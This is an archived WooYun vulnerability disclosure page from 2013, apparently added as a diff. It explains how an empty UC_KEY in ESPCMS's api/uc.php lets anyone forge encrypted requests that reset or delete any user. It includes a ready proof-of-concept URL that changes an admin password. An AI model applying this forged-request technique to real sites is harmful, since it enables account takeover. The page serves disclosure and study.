@@ -1,0 +1,250 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ESPCMS某接口文件存在缺陷可重置任意用户密码  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ESPCMS某接口文件存在缺陷可重置任意用户密码  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/viekst">viekst</a> 
+</li><li>提交时间：		2013-08-30 19:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-04：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-11-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ESPCMS某接口文件存在缺陷可重置任意用户密码，还可造成SQL注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/espcms_utf8_5.7.13.08.15_b/upload/api/uc.php<br />
+<br />
+该文件可能是用作 与ucenter做接口的，espcms在默认安装存在，<br />
+<br />
+第36行起<br />
+<br />
+</p><pre><code>...<br />
+$_DCACHE = $get = $post = array();<br />
+	$code = @$_GET[&#039;code&#039;];<br />
+	parse_str(_authcode($code, &#039;DECODE&#039;, UC_KEY), $get);<br />
+	if (MAGIC_QUOTES_GPC) {<br />
+		$get = _stripslashes($get);<br />
+	}<br />
+...</code></pre><p class='detail'><br />
+<br />
+code变量从get中获取后经过_authcode函数解密成字符串 接着解析到变量中，<br />
+<br />
+重点来到_authcode函数，这是一个经典的的流密码实现的算法,定义密匙通过抑或运算得到密文，很多开源CMS都有用到，ESPCMS的cookie也是用的该种加密<br />
+<br />
+</p><pre><code>function _authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+	$ckey_length = 4;<br />
+<br />
+	$key = md5($key ? $key : UC_KEY);<br />
+	$keya = md5(substr($key, 0, 16));<br />
+	$keyb = md5(substr($key, 16, 16));<br />
+	$keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+<br />
+	$cryptkey = $keya . md5($keya . $keyc);<br />
+	$key_length = strlen($cryptkey);<br />
+<br />
+	$string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;<br />
+	$string_length = strlen($string);<br />
+<br />
+	$result = &#039;&#039;;<br />
+	$box = range(0, 255);<br />
+<br />
+	$rndkey = array();<br />
+	for ($i = 0; $i &lt;= 255; $i++) {<br />
+		$rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+	}<br />
+<br />
+	for ($j = $i = 0; $i &lt; 256; $i++) {<br />
+		$j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+		$tmp = $box[$i];<br />
+		$box[$i] = $box[$j];<br />
+		$box[$j] = $tmp;<br />
+	}<br />
+<br />
+	for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+		$a = ($a + 1) % 256;<br />
+		$j = ($j + $box[$a]) % 256;<br />
+		$tmp = $box[$a];<br />
+		$box[$a] = $box[$j];<br />
+		$box[$j] = $tmp;<br />
+		$result.=chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+	}<br />
+<br />
+	if ($operation == &#039;DECODE&#039;) {<br />
+		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {<br />
+			return substr($result, 26);<br />
+		} else {<br />
+			return &#039;&#039;;<br />
+		}<br />
+	} else {<br />
+		return $keyc . str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+但是注意该处的密匙UC_KEY没有定义，也没有用到db_pscode，该处是空的，<br />
+<br />
+那么我们就可以通过_authcode算法自行加密了，<br />
+<br />
+接着往下看<br />
+<br />
+</p><pre><code>...<br />
+include_once DISCUZ_ROOT2 . &#039;datacache/public.php&#039;;<br />
+		require_once DISCUZ_ROOT . &#039;./class_dbMysql.php&#039;;<br />
+		$GLOBALS[&#039;db&#039;] = new dbmysql();<br />
+		$GLOBALS[&#039;db&#039;]-&gt;connect(db_host, db_user, db_pw, db_name, db_charset, 1);<br />
+		$GLOBALS[&#039;tablepre&#039;] = db_prefix;<br />
+		$uc_note = new uc_note();<br />
+		$turecode = $uc_note-&gt;$get[&#039;action&#039;]($get, $post);<br />
+		exit($uc_note-&gt;$get[&#039;action&#039;]($get, $post));<br />
+...</code></pre><p class='detail'><br />
+<br />
+到了这里我们就可以调用以下方法了，改密码，改用户，删用户什么的，<br />
+<br />
+</p><pre><code>&#039;test&#039;, &#039;deleteuser&#039;, &#039;renameuser&#039;, &#039;gettag&#039;, &#039;synlogin&#039;, &#039;synlogout&#039;, &#039;updatepw&#039;, &#039;updatebadwords&#039;, &#039;updatehosts&#039;, &#039;updateapps&#039;, &#039;updateclient&#039;, &#039;updatecredit&#039;, &#039;getcreditsettings&#039;, &#039;updatecreditsettings&#039;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>code = _authcode(&#039;action=updatepw&amp;time=1477834492&amp;username=admin888&amp;password=1111111&#039;,&#039;ENCODE&#039;,&#039;&#039;)<br />
+http://demo.ecisp.cn/api/uc.php?code=094epCszE0DZRnt2Pv34E8VkGrLYXsXizGVzdzeJIhXoTx7N8w%2bLG6zR0zWMwkUbhtyXrBEFXHctzJrLdiu6aaixIJYNH0%2bt9U%2byhpmQhvgwFM11ss9oe%2faJ2uc7KGQ   //将admin888用户密码改为1111111</code></pre><p class='detail'><br />
+<br />
+另外上面在进行数据库查询的时候未做任何过滤，还可引起SQL注入 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">没有用的就删除了.. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/viekst" title="viekst">viekst</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035697" title="ESPCMS某接口文件存在缺陷可重置任意用户密码">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-04 19:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35697";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
